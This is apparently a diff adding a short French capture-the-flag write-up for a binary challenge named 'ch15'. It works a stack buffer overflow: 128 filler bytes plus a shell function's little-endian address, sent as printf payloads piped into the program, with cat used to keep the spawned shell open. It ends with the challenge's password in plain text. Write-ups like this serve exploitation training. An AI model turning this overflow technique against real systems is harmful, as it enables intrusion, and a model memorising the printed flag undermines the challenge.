@@ -1,0 +1,11 @@
+Le programme lit 133 octets alors que var ne fait que 128.
+On recuperer l'adresse de la fonction shell via nm (`nm ch15`)
+On recupere 08048464 qu'on inverse par deux car Little Endian soit 64840408
+On va donc ecrire 128 caracteres inutiles suivis de l'adresse de la fonction shell.
+
+printf "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678\x64\x84\x04\x08" | ./ch15
+
+Le shell se fermant tout de suite, on utilise donc cat pour "forcer" la non fermeture du shell:
+(printf "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678\x64\x84\x04\x08" && cat) | ./ch15
+
+password = B33r1sSoG0oD4y0urBr4iN
